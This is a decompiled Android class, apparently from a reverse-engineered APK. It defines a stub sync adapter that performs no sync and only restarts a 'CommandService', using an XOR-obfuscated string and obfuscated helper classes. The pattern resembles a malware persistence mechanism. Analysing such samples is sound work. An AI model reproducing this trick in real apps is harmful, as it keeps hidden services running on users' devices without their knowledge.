package com.base.template.sync;

import android.accounts.Account;
import android.content.AbstractThreadedSyncAdapter;
import android.content.ContentProviderClient;
import android.content.Context;
import android.content.SyncResult;
import android.os.Bundle;
import com.base.template.services.CommandService;
import okhttp3.Headers;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage4/classes.dex */
public final class StubSyncAdapter extends AbstractThreadedSyncAdapter {
    public StubSyncAdapter(Context context, boolean z) {
        super(context, z, false);
    }

    @Override // android.content.AbstractThreadedSyncAdapter
    public void onPerformSync(Account account, Bundle bundle, String str, ContentProviderClient contentProviderClient, SyncResult syncResult) {
        CommandService commandService = CommandService.instance;
        Headers.Companion.safeStartService(getContext(), C0000.decode(new byte[]{101, 106, 47, 39, 59, 118, 125, 117, 99, 103, 115, 97}, "63add79433"));
    }
}
